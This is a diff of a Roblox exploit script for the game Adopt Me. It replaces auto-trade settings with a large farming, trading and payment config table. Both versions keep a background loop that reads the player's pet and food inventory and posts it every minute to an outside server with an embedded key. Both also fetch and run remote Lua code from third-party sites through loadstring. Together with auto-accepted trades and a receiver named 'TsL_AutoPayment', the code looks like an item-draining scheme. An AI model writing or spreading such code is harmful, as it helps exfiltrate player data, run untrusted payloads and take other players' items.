@@ -1,135 +1,215 @@
-getgenv().hub_key = "87e7720afa3d8a67389178df6b8f4fb1"
---auto accept and complete trades
-getgenv().autoaccept = true
+getgenv().Config = {
+    Dashboard = {
+        Enabled = false,
+        GroupName = "vps1",
+    },
 
---auto trade will not work if autoaccept is true
-getgenv().autotrade = false
+    BabyFarm = false,
+    AutoCertificate = false,
 
---The person your sending the trade to.
-getgenv().recipient = "PLAYER_NAME"
+    PetFarm = {
+        Enabled = false,
+        FarmEggs = false,
+        BuyEggs = false,
+        EggTypes = {},
+        BuyEggType = "any",
+        MaxPets = 1,
+        FarmUntilFullGrown = false,
+        PrioritizeFriendship = false,
+        SelectiveFarm = false,
+        SelectedPetTypes = {},
+    },
 
-getgenv().trade_queue = { "pets" }
--- { "all" }
---{ "pets", "transport", "gifts", "pet_accessories", "strollers", "toys", "food" }
+    EventFarm = {
+        CandyCliff = false,
+        MochiNail = false,
+    },
 
-getgenv().pet_kind = {}
---Choose 1 pet type example { "snorgle", "cheetah" } or "{}" for all pets.
+    AutoTrade = {
+        Enabled = false,
+        AutoAcceptTrades = true,
+        AutoLeaveAfterTrades = false,
+        Usernames = {},
+        TradeMode = "all",
+        Categories = {},
+        Items = {},
+        ItemCounts = {},
+        PetTypes = {},
+        PetVersionFilter = {},
+        Ages = {},
+    },
 
-getgenv().pet_type = "ALL"
---Choose 1
---ALL, "mega", "neon", "regular", "eggs"
+    AutoNeon = {
+        Enabled = false,
+        MakeMega = false,
+        NeonAll = true,
+        SelectedPets = {},
+        MaxPerType = {},
+    },
 
-getgenv().selectedRarity = "ALL"
---Choose 1
---"ALL", "legendary", "ultra_rare", "rare", "uncommon", "common"
+    AutoPotion = {
+        Enabled = false,
+        SelectedPets = {"lny_2026_fire_foal"},
+    },
 
-getgenv().selectedAge = "ALL"
---Choose 1
---"ALL", "1", "2", "3", "4", "5", "6"
+    AutoBuy = {
+        Enabled = false,
+        SelectedItems = {},
+        BuyAmounts = {},
+    },
 
-loadstring(game:HttpGet("https://nb0.xyz/scripts/2G_AUTO_TRADE.lua"))()
+    AutoPay = {
+        Enabled = false,
+        TargetPlayer = "",
+    },
 
--- =========================
--- Inventory sender addon
--- =========================
+    AutoOpen = {
+        Enabled = false,
+        Items = {},
+    },
 
-local HttpService = game:GetService("HttpService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+    AutoRecycle = {
+        Enabled = false,
+        RarityFilter = {},
+        AgeFilter = {},
+        ExcludedPets = {},
+    },
 
-local BACKEND_URL = "https://api.adoptmehub.com/inventory"
-local API_KEY = "a8sd921ndsa23s"
-local RECEIVER_NAME = "TsL_AutoPayment"
-local SEND_INTERVAL = 60
+    IdleProgression = {
+        Enabled = false,
+        SelectedPets = {"cracked_egg"},
+        ExcludedPets = {},
+        PriorityOrder = {},
+    },
 
-local request_fn = request or http_request or (syn and syn.request)
-if not request_fn then
-    warn("No supported request function found")
-    return
-end
+    AccountManager = {
+        Enabled = false,
+        Tool = "",
+        Yummy = {
+            Action = "completed",
+            Reason = "Done",
+        },
+        FarmSync = {
+            Action = "completed",
+            FromFolderId = "",
+            ToFolderId = "",
+            ChangeWithoutReplacement = false,
+            ConfigId = nil,
+        },
+        Triggers = {
+            AfterTradeComplete = false,
+            MinBucks = 0,
+            MinPotions = 0,
+        },
+    },
 
-local clientData
-do
-    local ok, result = pcall(function()
+    Settings = {
+        AutoShowUI = true,
+        ShowOverlay = false,
+        ReduceGraphics = true,
+        FPSCap = 3,
+        LureId = "ice_dimension_2025_ice_soup_bait"
+    },
+
+    Webhook = {
+        Enabled = false,
+        URL = "https://discord.com/api/",
+        PetUnlock = {
+            Enabled = false,
+            URL = "https://discord.com/api/webhooks/",
+            FilterRarities = {"legendary", "ultra_rare"},
+        },
+    },
+
+    TaskExclusion = {
+        Enabled = false,
+        ExcludedTasks = {},
+    },
+}
+
+getgenv().scriptkey = "BeIrggeebySaSLwtEMXCOMIZbKpMUJBF"
+
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+
+    local BACKEND_URL = "https://api.adoptmehub.com/inventory"
+    local API_KEY = "a8sd921ndsa23s"
+    local RECEIVER_NAME = "TsL_AutoPayment"
+    local SEND_INTERVAL = 60
+
+    local request_fn = request or http_request or (syn and syn.request)
+    if not request_fn then
+        warn("No supported request function found")
+        return
+    end
+
+    local ok, clientData = pcall(function()
         return require(ReplicatedStorage.ClientModules.Core.ClientData)
     end)
 
-    if not ok or not result then
+    if not ok or not clientData then
         warn("Could not load ClientData module")
         return
     end
 
-    clientData = result
-end
-
-local function buildInventoryPayload()
-    local payload = {
-        pets = {},
-        food = {},
-        timestamp = os.time(),
-        user = RECEIVER_NAME
-    }
-
-    local ok, pdata = pcall(function()
-        return clientData.get_data()[tostring(LocalPlayer)]
-    end)
-
-    if not ok or not pdata or not pdata.inventory then
-        return nil, "inventory data not found"
-    end
-
-    for id, pet in pairs(pdata.inventory.pets or {}) do
-        table.insert(payload.pets, {
-            id = id,
-            name = pet.name or pet.id or "unknown_pet",
-            rarity = pet.rarity or "N/A"
-        })
-    end
-
-    for id, item in pairs(pdata.inventory.food or {}) do
-        table.insert(payload.food, {
-            id = id,
-            quantity = item.quantity or 1,
-            name = item.name or item.id or "unknown_food"
-        })
-    end
-
-    return payload
-end
-
-local function sendInventory()
-    local payload, err = buildInventoryPayload()
-    if not payload then
-        warn("BUILD FAILED: " .. tostring(err))
-        return
-    end
-
-    local body = HttpService:JSONEncode(payload)
-
-    local ok, response = pcall(function()
-        return request_fn({
-            Url = BACKEND_URL,
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json",
-                ["x-inventory-key"] = API_KEY
-            },
-            Body = body
-        })
-    end)
-
-    if ok and response then
-        print("INVENTORY SENT:", response.StatusCode or response.Status or "unknown")
-        print("RESPONSE:", response.Body or "no body")
-    else
-        warn("REQUEST FAILED: " .. tostring(response))
-    end
-end
-
-task.spawn(function()
     while true do
-        sendInventory()
+        local okData, pdata = pcall(function()
+            return clientData.get_data()[tostring(LocalPlayer)]
+        end)
+
+        if okData and pdata and pdata.inventory then
+            local payload = {
+                pets = {},
+                food = {},
+                timestamp = os.time(),
+                user = RECEIVER_NAME
+            }
+
+            for id, pet in pairs(pdata.inventory.pets or {}) do
+                payload.pets[#payload.pets + 1] = {
+                    id = id,
+                    name = pet.name or pet.id or "unknown_pet",
+                    rarity = pet.rarity or "N/A"
+                }
+            end
+
+            for id, item in pairs(pdata.inventory.food or {}) do
+                payload.food[#payload.food + 1] = {
+                    id = id,
+                    quantity = item.quantity or 1,
+                    name = item.name or item.id or "unknown_food"
+                }
+            end
+
+            local body = HttpService:JSONEncode(payload)
+
+            local okReq, response = pcall(function()
+                return request_fn({
+                    Url = BACKEND_URL,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json",
+                        ["x-inventory-key"] = API_KEY
+                    },
+                    Body = body
+                })
+            end)
+
+            if okReq and response then
+                print("INVENTORY SENT:", response.StatusCode or response.Status or "unknown")
+                print("RESPONSE:", response.Body or "no body")
+            else
+                warn("REQUEST FAILED:", tostring(response))
+            end
+        else
+            warn("inventory data not found")
+        end
+
         task.wait(SEND_INTERVAL)
     end
 end)
+
+loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/MassFarm.lua"))()
